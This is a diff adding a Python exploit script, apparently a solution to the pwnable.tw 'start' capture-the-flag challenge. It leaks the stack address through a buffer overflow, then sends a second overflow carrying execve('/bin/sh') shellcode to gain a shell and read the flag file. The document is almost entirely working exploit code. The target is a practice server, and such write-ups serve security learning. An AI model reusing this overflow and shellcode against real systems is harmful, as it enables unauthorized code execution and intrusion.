@@ -1,0 +1,19 @@
+import socket
+from struct import *
+
+s = socket.create_connection(("chall.pwnable.tw", 10000))
+print(s.recv(1000))
+
+s.send('a'*20 + pack('<I', 0x08048087))
+esp = unpack('<I', s.recv(100)[:4])[0]
+
+payload = 'a'*20
+payload += pack('<I', esp + 20)
+payload += "\x31\xc0\x50\x68\x2f\x2f\x73"
+payload += "\x68\x68\x2f\x62\x69\x6e\x89"
+payload += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
+payload += "\xcd\x80\x31\xc0\x40\xcd\x80"
+
+s.send(payload)
+s.send('cat /home/start/flag\n')
+print('The flag is : {}'.format(s.recv(200)))
